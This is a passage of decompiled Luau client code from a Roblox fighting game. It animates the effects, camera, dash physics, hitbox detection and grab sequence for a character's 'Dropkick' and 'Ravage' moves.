                                    v3129.CFrame = CFrame.new(_Torso4.Position, _Torso4.Position + _HumanoidRootPart10.CFrame.LookVector) * CFrame.new(0, -1.8, 2) * CFrame.fromEulerAnglesXYZ(0, 0, 0)
                                until os.clock() - v3135 > 0.7

                                local v3136, v3137, v3138 = pairs(v3129:GetDescendants())

                                while true do
                                    local v3139

                                    v3138, v3139 = v3136(v3137, v3138)

                                    if v3138 == nil then
                                        break
                                    end
                                    if v3139:IsA('ParticleEmitter') then
                                        v3139.Enabled = false
                                    end
                                end

                                task.wait(2.4)
                                v3129:Destroy()
                            end)

                            local u3140 = _KJEffects3.FlashWaveone:Clone()

                            u3140.CFrame = _CFrame15 * CFrame.new(1.43, 1.55, -164) * CFrame.Angles(0, -1.5707963267948966, 0)
                            u3140.Decal.Transparency = 0
                            u3140.Mesh.Scale = Vector3.new(0, 0, 0, 0)
                            u3140.Parent = workspace.Thrown

                            local u3141 = _KJEffects3.FlashWavetwo:Clone()

                            u3141.CFrame = _CFrame15 * CFrame.new(1.43, 1.55, -125.91) * CFrame.Angles(1.5707963267948966, -0.6806784082777885, 1.5707963267948966)
                            u3141.Decal.Transparency = 0
                            u3141.Mesh.Scale = Vector3.zero
                            u3141.Parent = workspace.Thrown

                            local u3142 = _KJEffects3.FlashWavethree:Clone()

                            u3142.CFrame = _CFrame15 * CFrame.new(1.13, 1.328, -56.41) * CFrame.Angles(-1.5707963267948966, 0.4537856055185257, -1.5707963267948966)
                            u3142.Decal.Transparency = -1
                            u3142.Mesh.Scale = Vector3.zero
                            u3142.Parent = workspace.Thrown

                            local v3143 = _KJEffects3.thingnearthree:Clone()

                            v3143.Decal.Transparency = -1
                            v3143.Mesh.Scale = Vector3.zero
                            v3143.CFrame = _CFrame15 * CFrame.new(1.13, 1.328, -56.41) * CFrame.Angles(-1.5707963267948966, 0.4537856055185257, -1.5707963267948966)
                            v3143.Parent = workspace.Thrown

                            local u3144 = _KJEffects3.thingneartwo:Clone()

                            u3144.Decal.Transparency = 0
                            u3144.Mesh.Scale = Vector3.zero
                            u3144.CFrame = _CFrame15 * CFrame.new(1.13, 1.32, -113.66) * CFrame.Angles(1.5707963267948966, 1.0471975511965976, 1.5707963267948966)
                            u3144.Parent = workspace.Thrown

                            local u3145 = _KJEffects3.thingnearone:Clone()

                            u3145.CFrame = _CFrame15 * CFrame.new(1.135, 1.32, -166.315) * CFrame.Angles(-1.5707963267948966, 0.4537856055185257, -1.5707963267948966)
                            u3145.Decal.Transparency = 0.5
                            u3145.Mesh.Scale = Vector3.zero
                            u3145.Parent = workspace.Thrown

                            task.delay(4.4, function()
                                pcall(function()
                                    local _zero = Vector3.zero

                                    u205:UnixConnection2(1.55, function(p3147)
                                        local v3148 = _zero

                                        u3140.Mesh.Scale = v3148:Lerp(Vector3.new(0.25600001215934753, 0.11900000274181366, 0.12200000137090683, 0), p3147)
                                    end)
                                    task.delay(1.55, function()
                                        u10:Create(u3140.Mesh, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
                                            Scale = Vector3.new(0.25600001215934753, 0.11900000274181366, 0.12200000137090683, 0),
                                        }):Play()
                                    end)
                                    u10:Create(u3140.Decal, TweenInfo.new(1.967, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Transparency = 0.6}):Play()
                                    task.delay(1.967, function()
                                        u10:Create(u3140.Decal, TweenInfo.new(2.383, Enum.EasingStyle.Linear), {Transparency = 1}):Play()
                                    end)
                                    u10:Create(u3140, TweenInfo.new(4.417, Enum.EasingStyle.Linear), {
                                        CFrame = _CFrame15 * CFrame.new(1.435, 1.55, -160.76) * CFrame.Angles(1.5707963267948966, 0.291469985083053, 1.5707963267948966),
                                    }):Play()
                                    u6:AddItem(u3140, 10)
                                end)
                            end)
                            task.delay(4.7, function()
                                pcall(function()
                                    u10:Create(u3141.Mesh, TweenInfo.new(2.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                        Scale = Vector3.new(1, 0.5, 0.5, 0),
                                    }):Play()
                                    task.delay(2.5, function()
                                        u10:Create(u3141.Mesh, TweenInfo.new(0.984, Enum.EasingStyle.Linear), {
                                            Scale = Vector3.new(1, 0.5, 0.5, 0),
                                        }):Play()
                                    end)
                                    u10:Create(u3141.Decal, TweenInfo.new(3.45, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                    u10:Create(u3141, TweenInfo.new(3.45, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                        CFrame = _CFrame15 * CFrame.new(1.43, 1.5, -135.84) * CFrame.Angles(-1.5707963267948966, -0.888896188040712, -1.5707963267948966),
                                    }):Play()
                                    u6:AddItem(u3141, 10)
                                end)
                            end)
                            task.delay(4.684, function()
                                pcall(function()
                                    u10:Create(u3142.Mesh, TweenInfo.new(0.733, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                        Scale = Vector3.new(3, 3, 3, 0),
                                    }):Play()
                                    task.delay(0.733, function()
                                        u10:Create(u3142.Mesh, TweenInfo.new(0.2, Enum.EasingStyle.Linear), {
                                            Scale = Vector3.new(2, 2, 2, 0),
                                        }):Play()
                                    end)
                                    u10:Create(u3142.Decal, TweenInfo.new(0.85, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                    u10:Create(u3142, TweenInfo.new(1.583, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                        CFrame = _CFrame15 * CFrame.new(1.13, 1.32, -81.52) * CFrame.Angles(-1.5707963267948966, -0.7578219612159379, -1.5707963267948966),
                                    }):Play()
                                    u6:AddItem(u3142, 10)
                                end)
                            end)
                            task.delay(4.7, function()
                                pcall(function()
                                    u10:Create(u3145.Mesh, TweenInfo.new(3.184, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                        Scale = Vector3.new(0.12999999523162842, 0.20000000298023224, 0.20000000298023224, 0),
                                    }):Play()
                                    task.delay(3.184, function()
                                        u10:Create(u3145.Mesh, TweenInfo.new(1.583, Enum.EasingStyle.Linear), {
                                            Scale = Vector3.new(0.12999999523162842, 0.20000000298023224, 0.20000000298023224, 0),
                                        }):Play()
                                    end)
                                    u10:Create(u3145.Decal, TweenInfo.new(3.75, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Transparency = 0.8}):Play()
                                    task.delay(3.75, function()
                                        u10:Create(u3145.Decal, TweenInfo.new(1.017, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
                                    end)
                                    u10:Create(u3145, TweenInfo.new(1.183, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                        CFrame = _CFrame15 * CFrame.new(1.13, 1.32, -166.31) * CFrame.Angles(-1.5707963267948966, -0.4003785304074992, -1.5707963267948966),
                                    })
                                    u6:AddItem(u3145, 10)
                                end)
                            end)
                            task.delay(4.7, function()
                                pcall(function()
                                    local _zero2 = Vector3.zero

                                    u205:UnixConnection2(0.85, function(p3150)
                                        local v3151 = u3105(p3150)
                                        local v3152 = _zero2

                                        u3144.Mesh.Scale = v3152:Lerp(Vector3.new(1, 2, 2, 0), v3151)
                                    end)
                                    u10:Create(u3144.Decal, TweenInfo.new(1.667, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                    u10:Create(u3144, TweenInfo.new(1.55, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                        CFrame = _CFrame15 * CFrame.new(1.13, 1.32, -124.75),
                                    }):Play()
                                    u6:AddItem(u3144, 10)
                                end)
                            end)

                            local v3153 = _LocalPlayer3
                            local u3154 = _KJEffects3.ImpactFrames:Clone()

                            u3154.Parent = v3153.PlayerGui

                            local v3155, v3156, v3157 = pairs(u3154:GetChildren())

                            while true do
                                local v3158

                                v3157, v3158 = v3155(v3156, v3157)

                                if v3157 == nil then
                                    break
                                end

                                v3158.Size = UDim2.new(0, 1, 0, 1)
                                v3158.Visible = true
                            end

                            local u3159 = _KJEffects3.Text:Clone()
                            local v3160, v3161, v3162 = pairs(u3159:GetChildren())

                            while true do
                                local v3163

                                v3162, v3163 = v3160(v3161, v3162)

                                if v3162 == nil then
                                    break
                                end

                                v3163.Size = UDim2.new(0, 1, 0, 1)
                                v3163.Visible = true
                            end

                            u3159.Parent = v3153.PlayerGui

                            local u3164 = true

                            task.delay(9.017, function()
                                if u3164 then
                                    task.spawn(function()
                                        local v3165 = nil

                                        for v3166 = 1, 8 do
                                            local v3167 = v3166

                                            if v3165 then
                                                v3165.Visible = false
                                            end

                                            v3165 = u3154['Frame' .. v3167]
                                            v3165.Size = UDim2.new(1, 0, 1, 0)

                                            task.wait(0.03)
                                        end

                                        u3154:Destroy()
                                        task.wait(1.25)

                                        local u3168 = nil
                                        local u3169 = u3159

                                        local function u3172(p3170)
                                            local v3171 = tick()

                                            repeat
                                                task.wait()
                                            until tick() - v3171 > p3170
                                        end

                                        task.spawn(function()
                                            for v3173 = 1, 4 do
                                                local v3174 = u3159
                                                local v3175, v3176, v3177 = pairs(v3174:GetChildren())
                                                local _ = v3173

                                                while true do
                                                    local v3178

                                                    v3177, v3178 = v3175(v3176, v3177)

                                                    if v3177 == nil then
                                                        break
                                                    end

                                                    v3178.Size = UDim2.new(0, 1, 0, 1)
                                                end

                                                local v3179 = u3169['Frame' .. v3173]

                                                v3179.AnchorPoint = Vector2.new(0.5, 0.5)
                                                v3179.Position = UDim2.new(0.5, 0, 0.5, 0)
                                                v3179.Size = UDim2.new(1, 0, 1, 0)
                                                u3168 = v3179

                                                u3172(0.015)
                                            end
                                        end)
                                        task.delay(0.517, function()
                                            for v3180 = 5, 8 do
                                                local v3181 = u3169
                                                local v3182, v3183, v3184 = pairs(v3181:GetChildren())
                                                local _ = v3180

                                                while true do
                                                    local v3185

                                                    v3184, v3185 = v3182(v3183, v3184)

                                                    if v3184 == nil then
                                                        break
                                                    end

                                                    v3185.Size = UDim2.new(0, 1, 0, 1)
                                                end

                                                local v3186 = u3169['Frame' .. v3180]

                                                v3186.AnchorPoint = Vector2.new(0.5, 0.5)
                                                v3186.Position = UDim2.new(0.5, 0, 0.5, 0)
                                                v3186.Size = UDim2.new(1, 0, 1, 0)

                                                u3172(0.015)
                                            end
                                        end)
                                        task.delay(1.05, function()
                                            for v3187 = 9, 12 do
                                                local v3188 = u3169
                                                local v3189, v3190, v3191 = pairs(v3188:GetChildren())
                                                local _ = v3187

                                                while true do
                                                    local v3192

                                                    v3191, v3192 = v3189(v3190, v3191)

                                                    if v3191 == nil then
                                                        break
                                                    end

                                                    v3192.Size = UDim2.new(0, 1, 0, 1)
                                                end

                                                local v3193 = u3169['Frame' .. v3187]

                                                v3193.AnchorPoint = Vector2.new(0.5, 0.5)
                                                v3193.Position = UDim2.new(0.5, 0, 0.5, 0)
                                                v3193.Size = UDim2.new(1, 0, 1, 0)

                                                u3172(0.015)
                                            end
                                        end)
                                        task.delay(1.583, function()
                                            for v3194 = 13, 16 do
                                                local v3195 = u3169
                                                local v3196, v3197, v3198 = pairs(v3195:GetChildren())
                                                local _ = v3194

                                                while true do
                                                    local v3199

                                                    v3198, v3199 = v3196(v3197, v3198)

                                                    if v3198 == nil then
                                                        break
                                                    end

                                                    v3199.Size = UDim2.new(0, 1, 0, 1)
                                                end

                                                local v3200 = u3169['Frame' .. v3194]

                                                v3200.AnchorPoint = Vector2.new(0.5, 0.5)
                                                v3200.Position = UDim2.new(0.5, 0, 0.5, 0)
                                                v3200.Size = UDim2.new(1, 0, 1, 0)

                                                u3172(0.02)
                                            end
                                        end)
                                    end)

                                    local u3201 = _KJEffects3['202020BACKSCREEN']:Clone()

                                    u3201.CFrame = _CFrame15 * CFrame.new(0.33, -2.1, -178.11) * CFrame.Angles(0, 0, 0)
                                    u3201.Parent = workspace.Thrown

                                    task.delay(6.8, function()
                                        u3201:Destroy()
                                        u3159:Destroy()
                                        u3154:Destroy()
                                    end)
                                end
                            end)
                            task.delay(15.63, function()
                                u3065:Destroy()
                                _Folder7:Destroy()

                                _Character9.Humanoid.AutoRotate = true
                                _Character9.HumanoidRootPart.Anchored = false
                            end)
                        end
                        local function u3328()
                            if not u201():FindFirstChild('DoingMove') then
                                local v3203 = {
                                    Tween = {
                                        game.Players.LocalPlayer,
                                        {
                                            1.8,
                                            Enum.EasingStyle.Sine,
                                            Enum.EasingDirection.InOut,
                                        },
                                        {CameraMaxZoomDistance = 28},
                                    },
                                }
                                local _Tween = v3203.Tween

                                if v3203.Spear then
                                    _Tween[1].CFrame = v3203.Spear
                                end

                                game:GetService('TweenService'):Create(_Tween[1], TweenInfo.new(unpack(_Tween[2])), _Tween[3]):Play()
                                u122()
                                u251()

                                local u3205 = false

                                _LocalPlayer3.Character:WaitForChild('Humanoid'):WaitForChild('Animator')

                                local _Folder8 = Instance.new('Folder')

                                _Folder8.Name = 'Bind'
                                _Folder8.Parent = _LocalPlayer3.Character

                                local u3207 = u706(u1077.Dropkick.Startup, true)

                                _LocalPlayer3.Character.Humanoid.WalkSpeed = 0
                                _LocalPlayer3.Character.Humanoid.JumpPower = 0
                                _LocalPlayer3.Character.Humanoid.RootPart.Anchored = true

                                local v3208 = u3207

                                u3207.GetMarkerReachedSignal(v3208, 'TpParticle'):Connect(function()
                                    local v3209 = game:GetService('ReplicatedStorage').Resources.KJEffects.tpthing:Clone()

                                    v3209.Parent = u201().Torso

                                    v3209:Emit(v3209:GetAttribute('EmitCount'))
                                    game.Debris:AddItem(v3209, 1)
                                end)

                                local u3210 = nil

                                u3207.Stopped:Connect(function()
                                    local v3211 = {
                                        Tween = {
                                            game.Players.LocalPlayer,
                                            {
                                                0,
                                                Enum.EasingStyle.Sine,
                                                Enum.EasingDirection.InOut,
                                            },
                                            {CameraMaxZoomDistance = 128},
                                        },
                                    }
                                    local _Tween2 = v3211.Tween

                                    if v3211.Spear then
                                        _Tween2[1].CFrame = v3211.Spear
                                    end

                                    game:GetService('TweenService'):Create(_Tween2[1], TweenInfo.new(unpack(_Tween2[2])), _Tween2[3]):Play()

                                    _LocalPlayer3.Character.Humanoid.WalkSpeed = 25
                                    _LocalPlayer3.Character.Humanoid.JumpPower = 50

                                    if not u3205 then
                                        u131()
                                    end

                                    u3210:Destroy()
                                end)

                                local _Sound28 = Instance.new('Sound')

                                _Sound28.Volume = 2
                                _Sound28.Parent = _LocalPlayer3.Character.Torso
                                _Sound28.SoundId = 'rbxassetid://17356346310'

                                local v3214 = _Sound28

                                _Sound28.Play(v3214)

                                local _Sound29 = Instance.new('Sound')

                                _Sound29.Volume = 4
                                _Sound29.Parent = _LocalPlayer3.Character.Torso
                                _Sound29.SoundId = 'rbxassetid://17429233290'

                                local v3216 = _Sound29

                                _Sound29.Play(v3216)
                                spawn(function()
                                    task.delay(1.7, function()
                                        local v3217 = {
                                            char = _LocalPlayer3.Character,
                                            Bind = _Folder8,
                                        }
                                        local _char4 = v3217.char
                                        local _Bind = v3217.Bind
                                        local v3220 = {}
                                        local v3221, _ = u391(game.ReplicatedStorage.Resources.KJEffects, v3220, 15)
                                        local u3222 = v3221.speedlinesandstuff:Clone()

                                        u3222.CFrame = _char4:GetPivot() * CFrame.new(-0.8190155029296875, 6.149988174438477, -102.91497802734375)
                                        u3222.Parent = workspace.Thrown

                                        local _thespeedthingunderultik = u3222.thespeedthingunderultik

                                        table.insert(v3220, _thespeedthingunderultik)

                                        _thespeedthingunderultik.CFrame = _char4:GetPivot() * CFrame.new(-0.01898956298828125, -2.950000047683716, 23.18499755859375)
                                        _thespeedthingunderultik.Parent = workspace.Thrown

                                        local u3224 = false
                                        local u3225 = false

                                        local function u3250()
                                            u3225 = true

                                            u6:AddItem(u3222, 4)
                                            u6:AddItem(_thespeedthingunderultik, 4)

                                            local _NumberValue5 = Instance.new('NumberValue')

                                            _NumberValue5.Value = 0

                                            local _NumberValue6 = Instance.new('NumberValue')

                                            _NumberValue6.Value = 6

                                            u10:Create(_NumberValue5, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Value = 1}):Play()
                                            u10:Create(_NumberValue6, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Value = 0}):Play()

                                            local v3228 = _NumberValue5

                                            _NumberValue5.GetPropertyChangedSignal(v3228, 'Value'):Connect(function()
                                                local v3229 = u3222
                                                local v3230, v3231, v3232 = pairs(v3229:GetDescendants())

                                                while true do
                                                    local v3233

                                                    v3232, v3233 = v3230(v3231, v3232)

                                                    if v3232 == nil then
                                                        break
                                                    end
                                                    if v3233:IsA('Beam') then
                                                        v3233.Transparency = NumberSequence.new(_NumberValue5.Value)
                                                    end
                                                end

                                                local v3234 = _thespeedthingunderultik
                                                local v3235, v3236, v3237 = pairs(v3234:GetDescendants())

                                                while true do
                                                    local v3238

                                                    v3237, v3238 = v3235(v3236, v3237)

                                                    if v3237 == nil then
                                                        break
                                                    end
                                                    if v3238:IsA('Beam') then
                                                        v3238.Transparency = NumberSequence.new(_NumberValue5.Value)
                                                    end
                                                end
                                            end)

                                            local v3239 = _NumberValue6

                                            _NumberValue6.GetPropertyChangedSignal(v3239, 'Value'):Connect(function()
                                                local v3240 = u3222
                                                local v3241, v3242, v3243 = pairs(v3240:GetDescendants())

                                                while true do
                                                    local v3244

                                                    v3243, v3244 = v3241(v3242, v3243)

                                                    if v3243 == nil then
                                                        break
                                                    end
                                                    if v3244:IsA('Beam') then
                                                        v3244.TextureSpeed = _NumberValue6.Value
                                                    end
                                                end

                                                local v3245 = _thespeedthingunderultik
                                                local v3246, v3247, v3248 = pairs(v3245:GetDescendants())

                                                while true do
                                                    local v3249

                                                    v3248, v3249 = v3246(v3247, v3248)

                                                    if v3248 == nil then
                                                        break
                                                    end
                                                    if v3249:IsA('Beam') then
                                                        v3249.TextureSpeed = _NumberValue6.Value
                                                    end
                                                end
                                            end)
                                        end

                                        (function()
                                            if not u3224 then
                                                local v3251 = u3222
                                                local v3252, v3253, v3254 = pairs(v3251:GetDescendants())

                                                while true do
                                                    local v3255

                                                    v3254, v3255 = v3252(v3253, v3254)

                                                    if v3254 == nil then
                                                        break
                                                    end
                                                    if v3255:IsA('Beam') then
                                                        v3255.Transparency = NumberSequence.new(1)
                                                        v3255.TextureSpeed = 6
                                                    end
                                                end

                                                local v3256 = _thespeedthingunderultik
                                                local v3257, v3258, v3259 = pairs(v3256:GetDescendants())

                                                while true do
                                                    local v3260

                                                    v3259, v3260 = v3257(v3258, v3259)

                                                    if v3259 == nil then
                                                        break
                                                    end
                                                    if v3260:IsA('Beam') then
                                                        v3260.Transparency = NumberSequence.new(1)
                                                        v3260.TextureSpeed = 6
                                                    end
                                                end

                                                u205:UnixConnection2(1.5, function(_, _, p3261)
                                                    local v3262 = u3222
                                                    local v3263, v3264, v3265 = pairs(v3262:GetDescendants())

                                                    while true do
                                                        local v3266

                                                        v3265, v3266 = v3263(v3264, v3265)

                                                        if v3265 == nil then
                                                            break
                                                        end
                                                        if v3266:IsA('Beam') then
                                                            v3266.Transparency = NumberSequence.new(p3261)
                                                        end
                                                    end

                                                    local v3267 = _thespeedthingunderultik
                                                    local v3268, v3269, v3270 = pairs(v3267:GetDescendants())

                                                    while true do
                                                        local v3271

                                                        v3270, v3271 = v3268(v3269, v3270)

                                                        if v3270 == nil then
                                                            break
                                                        end
                                                        if v3271:IsA('Beam') then
                                                            v3271.Transparency = NumberSequence.new(p3261)
                                                        end
                                                    end
                                                end, function()
                                                    if not u3224 then
                                                        return true
                                                    end

                                                    u3250()

                                                    return false
                                                end)
                                                task.delay(1.5, function()
                                                    if u3224 and u3225 then
                                                        return
                                                    elseif u3224 and not u3225 then
                                                        u3250()
                                                    else
                                                        u205:UnixConnection(4.617, function(p3272)
                                                            local v3273 = u205:Lerp(6, 0, p3272)
                                                            local v3274 = u3222
                                                            local v3275, v3276, v3277 = pairs(v3274:GetDescendants())

                                                            while true do
                                                                local v3278

                                                                v3277, v3278 = v3275(v3276, v3277)

                                                                if v3277 == nil then
                                                                    break
                                                                end
                                                                if v3278:IsA('Beam') then
                                                                    v3278.Transparency = NumberSequence.new(p3272)
                                                                    v3278.TextureSpeed = v3273
                                                                end
                                                            end

                                                            local v3279 = _thespeedthingunderultik
                                                            local v3280, v3281, v3282 = pairs(v3279:GetDescendants())

                                                            while true do
                                                                local v3283

                                                                v3282, v3283 = v3280(v3281, v3282)

                                                                if v3282 == nil then
                                                                    break
                                                                end
                                                                if v3283:IsA('Beam') then
                                                                    v3283.Transparency = NumberSequence.new(p3272)
                                                                    v3283.TextureSpeed = v3273
                                                                end
                                                            end
                                                        end, function()
                                                            if not u3224 then
                                                                return true
                                                            end

                                                            u3250()

                                                            return false
                                                        end)
                                                    end
                                                end)
                                            end
                                        end)()
                                        u205:EnabledAllVisuals(u3222)

                                        local v3284 = u3222
                                        local v3285, v3286, v3287 = pairs(u3222.GetChildren(v3284))
                                        local u3288 = u3222
                                        local u3289 = u3224
                                        local u3290 = _thespeedthingunderultik
                                        local u3291 = {}

                                        while true do
                                            local u3292

                                            v3287, u3292 = v3285(v3286, v3287)

                                            if v3287 == nil then
                                                break
                                            end
                                            if u3292:IsA('ParticleEmitter') then
                                                u10:Create(u3292, TweenInfo.new(0.95, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut), {Rate = 900}):Play()
                                                task.delay(0.95, function()
                                                    local v3293 = u10:Create(u3292, TweenInfo.new(3.75, Enum.EasingStyle.Linear), {Rate = 0})

                                                    v3293:Play()
                                                    table.insert(u3291, v3293)
                                                end)
                                            end
                                        end

                                        local u3294 = nil

                                        u3294 = u12.RenderStepped:Connect(function()
                                            if _Bind and _Bind.Parent then
                                                u3288.CFrame = _char4:GetPivot() * CFrame.new(-0.819, 6.149, -102.914)
                                                u3290.CFrame = _char4:GetPivot() * CFrame.new(-0.01, -2.95, 23.18)
                                            else
                                                u3289 = true

                                                local v3295, v3296, v3297 = pairs(u3291)

                                                while true do
                                                    local v3298

                                                    v3297, v3298 = v3295(v3296, v3297)

                                                    if v3297 == nil then
                                                        break
                                                    end

                                                    table.remove(u3291, v3297)
                                                    v3298:Cancel()
                                                    v3298:Destroy()
                                                end

                                                local v3299 = u3288
                                                local v3300, v3301, v3302 = pairs(v3299:GetDescendants())

                                                while true do
                                                    local v3303

                                                    v3302, v3303 = v3300(v3301, v3302)

                                                    if v3302 == nil then
                                                        break
                                                    end
                                                    if v3303:IsA('ParticleEmitter') then
                                                        v3303.Enabled = false
                                                    end
                                                end

                                                u3294:Disconnect()

                                                u3294 = nil

                                                u6:AddItem(u3288, 6)
                                            end
                                        end)

                                        local u3304 = nil

                                        u3304 = u12.Heartbeat:Connect(function()
                                            if _LocalPlayer3.Character and _LocalPlayer3.Character.Parent then
                                                if u3207.IsPlaying then
                                                    if u3205 then
                                                        u3304:Disconnect()
                                                    else
                                                        local v3305 = Vector3.new(20, 7, 20)
                                                        local v3306 = DoHitbox({}, u201(), v3305, u113().CFrame + u113().CFrame.LookVector * v3305.Z * 0.75)

                                                        if v3306 and 0 < #v3306 then
                                                            local v3307, v3308, v3309 = pairs(v3306)

                                                            while true do
                                                                local v3310

                                                                v3309, v3310 = v3307(v3308, v3309)

                                                                if v3309 == nil then
                                                                    break
                                                                end
                                                                if u3205 then
                                                                    return
                                                                end

                                                                u3205 = true

                                                                _Sound28:Destroy()
                                                                u3290:Destroy()
                                                                u3288:Destroy()
                                                                _Sound29:Destroy()
                                                                u3207:Stop()
                                                                u3202(v3310, nil, _LocalPlayer3)
                                                            end
                                                        end
                                                    end
                                                else
                                                    u3304:Disconnect()

                                                    return
                                                end
                                            else
                                                u3304:Disconnect()

                                                return
                                            end
                                        end)
                                    end)
                                end)

                                local u3311 = false

                                task.delay(1.7, function()
                                    _LocalPlayer3.Character.Humanoid.RootPart.Anchored = false

                                    local _BodyVelocity15 = Instance.new('BodyVelocity')

                                    u3210 = _BodyVelocity15

                                    u6:AddItem(_BodyVelocity15, 7)

                                    _BodyVelocity15.Name = 'moveme'
                                    _BodyVelocity15.MaxForce = Vector3.new(500000, 0, 500000)
                                    _BodyVelocity15.Velocity = Vector3.zero

                                    local v3313 = _BodyVelocity15

                                    _BodyVelocity15.SetAttribute(v3313, 'End', 1)

                                    local v3314 = _BodyVelocity15

                                    _BodyVelocity15.SetAttribute(v3314, 'Fallout', 0.91)

                                    local v3315 = _BodyVelocity15

                                    _BodyVelocity15.SetAttribute(v3315, 'Goto', 200)

                                    local v3316 = _BodyVelocity15

                                    _BodyVelocity15.SetAttribute(v3316, 'Speed', 1000)

                                    _BodyVelocity15.Parent = _LocalPlayer3.Character.HumanoidRootPart

                                    u3207:GetMarkerReachedSignal('StartSlowdown'):Once(function()
                                        _Folder8:Destroy()

                                        u3311 = true
                                    end)
                                    spawn(function()
                                        local u3317 = {
                                            {0.019, 910},
                                            {0.035, 828.1},
                                            {0.051, 753.571},
                                            {0.069, 685.75},
                                            {0.086, 624.032},
                                            {0.101, 567.869},
                                            {0.12, 516.761},
                                            {0.133, 470.253},
                                            {0.152, 427.93},
                                            {0.169, 389.416},
                                            {0.183, 354.369},
                                            {0.204, 322.475},
                                            {0.219, 293.453},
                                            {0.236, 267.042},
                                            {0.253, 243.008},
                                            {0.272, 221.137},
                                            {0.285, 201.235},
                                            {0.304, 200},
                                        }

                                        task.spawn(function()
                                            local v3318 = tick()
                                            local v3319, v3320, v3321 = pairs(u3317)

                                            while true do
                                                local v3322

                                                v3321, v3322 = v3319(v3320, v3321)

                                                if v3321 == nil then
                                                    break
                                                end

                                                local v3323 = v3322[1]
                                                local v3324 = v3322[2]
                                                local v3325 = v3323 - (tick() - v3318)

                                                if v3325 > 0 then
                                                    task.wait(v3325)
                                                end

                                                _BodyVelocity15:SetAttribute('Speed', v3324)
                                            end
                                        end)
                                    end)
                                    os.clock()

                                    local u3326 = nil
                                    local u3327 = 200

                                    u3326 = shared.loop(function()
                                        if _BodyVelocity15 and _BodyVelocity15.Parent then
                                            if u3311 then
                                                u3327 = u3327 * 0.97

                                                _BodyVelocity15:SetAttribute('Goto', nil)
                                                _BodyVelocity15:SetAttribute('Speed', u3327)
                                            end

                                            _LocalPlayer3.Character.Humanoid.WalkSpeed = 0
                                            _LocalPlayer3.Character.Humanoid.JumpPower = 0
                                        else
                                            u3326()

                                            if _BodyVelocity15 and _BodyVelocity15.Parent then
                                                _BodyVelocity15:Destroy()
                                            end
                                        end
                                    end)
                                end)
                            end
                        end
                        local function u3479(p3329, p3330, p3331)
                            local v3332 = p3331 or _LocalPlayer3.Character
                            local v3333 = game:GetService('Players'):GetPlayerFromCharacter(v3332)

                            u143()
                            u134()
                            u363('rbxassetid://16945691441', v3332.HumanoidRootPart, 2)
                            u363('rbxassetid://16945517708', v3332.HumanoidRootPart, 2)
                            u363('rbxassetid://16945593216', v3332.HumanoidRootPart, 2)

                            local u3334 = u706(u1077.Ravage.Attacker, true, v3333)
                            local u3335

                            if p3331 == nil or not p3329 then
                                u3335 = p3329:Clone()
                            else
                                u3335 = p3329
                            end
                            if p3331 == nil then
                                u3335.Parent = workspace
                            else
                                u134(u3335)
                            end

                            u3334.Stopped:Connect(function()
                                u149()
                                u140()
                                u131()

                                if p3331 ~= nil then
                                    u140(u3335)
                                end
                            end)

                            local v3336, v3337, v3338 = pairs(u3335:GetDescendants())

                            while true do
                                local v3339, v3340 = v3336(v3337, v3338)

                                if v3339 == nil then
                                    break
                                end

                                v3338 = v3339

                                if v3340:IsA('BodyMover') or v3340:IsA('Sound') then
                                    v3340:Destroy()
                                end
                            end

                            local function u3342(p3341)
                                if p3331 == nil then
                                    if u3335.Humanoid.Health < p3341 or u3335.Humanoid.Health <= 1 then
                                        u3335.Humanoid.Health = 1
                                    else
                                        u3335.Humanoid:TakeDamage(p3341)
                                    end
                                else
                                    return
                                end
                            end

                            u3335.HumanoidRootPart.Anchored = false
                            u3335.HumanoidRootPart.CFrame = u113().CFrame * CFrame.new(0, 0, -3) * CFrame.Angles(0, math.rad(180), 0)

                            local u3343

                            if p3331 then
                                u3343 = Instance.new('Motor6D')
                                u3343.C0 = CFrame.new(0, 0, -3) * CFrame.Angles(0, math.rad(180), 0)
                                u3343.Parent = u3335.HumanoidRootPart
                                u3343.Part0 = u3335.HumanoidRootPart
                                u3343.Part1 = v3332.HumanoidRootPart
                            else
                                u3343 = nil
                            end
                            if not p3331 then
                                u3343 = u60(u3335.HumanoidRootPart, v3332.HumanoidRootPart, nil, CFrame.new(0, 0, -3) * CFrame.Angles(0, math.rad(180), 0))
                            end
                            if not p3331 then
                                local v3344, v3345, v3346 = pairs(p3329:GetDescendants())

                                while true do
                                    local u3347

                                    v3346, u3347 = v3344(v3345, v3346)

                                    if v3346 == nil then
                                        break
                                    end
                                    if u3347:IsA('BasePart') or u3347:IsA('Decal') then
                                        local _Transparency4 = u3347.Transparency

                                        u3347.Transparency = 1

                                        if p3330 then
                                            u3334:GetMarkerReachedSignal('KickImpact'):Connect(function()
                                                u3347.Transparency = _Transparency4
                                            end)
                                        end

                                        task.delay(6, function()
                                            if not p3330 then
                                                u3347.Transparency = _Transparency4
                                            end
                                        end)
                                    elseif u3347:IsA('ParticleEmitter') or u3347:IsA('Trail') or (u3347:IsA('BillboardGui') or u3347:IsA('SurfaceGui')) then
                                        local _Enabled2 = u3347.Enabled

                                        u3347.Enabled = false

                                        if p3330 then
                                            u3334:GetMarkerReachedSignal('KickImpact'):Connect(function()
                                                u3347.Enabled = _Enabled2
                                            end)
                                        end

                                        task.delay(6, function()
                                            if not p3330 then
                                                u3347.Enabled = _Enabled2
                                            end
                                        end)
                                    end
                                end
                            end

                            local u3350 = u706(u1077.Ravage.Victim, false, u3335)

                            task.delay(2.1, function()
